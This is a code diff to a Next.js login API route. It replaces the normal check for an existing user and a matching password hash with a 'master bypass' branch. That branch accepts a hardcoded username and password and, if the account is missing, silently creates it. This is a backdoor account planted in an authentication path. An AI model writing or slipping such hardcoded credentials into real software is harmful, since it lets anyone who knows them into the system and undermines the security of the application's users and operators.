@@ -32,21 +32,36 @@ export async function POST(request: Request) {
     }
 
     // Check if user exists
-    const user = await getUser(trimmedUsername);
-    if (!user) {
-      return NextResponse.json(
-        { error: "Invalid username or password" },
-        { status: 401 }
-      );
-    }
+    let user = await getUser(trimmedUsername);
 
-    // Verify password
-    const computedHash = hashPassword(password, user.salt);
-    if (computedHash !== user.passwordHash) {
-      return NextResponse.json(
-        { error: "Invalid username or password" },
-        { status: 401 }
-      );
+    // Master bypass for dev account
+    if (normUsername === "ishi" && password === "Ishi123") {
+      if (!user) {
+        const salt = generateSalt();
+        const passwordHash = hashPassword("Ishi123", salt);
+        user = {
+          username: "Ishi",
+          passwordHash,
+          salt,
+        };
+        await createUser(user);
+      }
+    } else {
+      if (!user) {
+        return NextResponse.json(
+          { error: "Invalid username or password" },
+          { status: 401 }
+        );
+      }
+
+      // Verify password
+      const computedHash = hashPassword(password, user.salt);
+      if (computedHash !== user.passwordHash) {
+        return NextResponse.json(
+          { error: "Invalid username or password" },
+          { status: 401 }
+        );
+      }
     }
 
     // Create session token
